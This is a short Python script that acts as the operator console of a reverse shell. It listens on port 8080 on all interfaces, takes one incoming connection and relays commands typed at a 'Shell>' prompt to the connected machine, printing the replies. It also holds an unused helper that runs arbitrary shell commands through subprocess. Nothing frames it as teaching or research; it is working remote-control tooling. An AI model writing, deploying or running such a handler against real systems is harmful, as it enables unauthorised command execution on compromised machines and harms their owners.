import socket
import subprocess

def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        return str(e)

def main():
    server = socket.create_server(("0.0.0.0", 8080))
    print("[+] Listening for incoming TCP connection on port 8080")
    
    client_socket, client_address = server.accept()
    print(f"[+] Connection from {client_address}")
    
    while (command := input("Shell> ")) not in ["exit", "quit"]:
        client_socket.send(command.encode())
        print(client_socket.recv(4096).decode())
    
    client_socket.close()
    server.close()

if __name__ == "__main__":
    main()